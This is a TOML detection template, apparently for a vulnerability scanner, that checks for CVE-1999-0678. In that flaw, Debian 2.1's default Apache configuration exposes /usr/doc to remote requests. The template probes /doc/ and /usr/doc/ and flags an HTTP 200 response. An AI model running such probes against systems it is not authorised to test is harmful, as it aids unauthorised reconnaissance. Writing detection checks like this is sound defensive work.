[info]
author = "AVE"
description = "检测 Debian GNU/Linux 2.1 Apache HTTPd 是否因 ServerRoot 默认指向 /usr/doc 目录而允许远程访问服务器文档文件"
id = "POC-AVE-1999-1016"
name = "Debian GNU/Linux Apache HTTPd 默认配置信息泄露 PoC"
severity = "medium"
tags = [
    "cve-1999-0678",
    "debian",
    "apache",
    "information-disclosure",
]
vuln_id = [
    "CVE-1999-0678",
    "AVE-1999-1016",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/doc/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/usr/doc/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
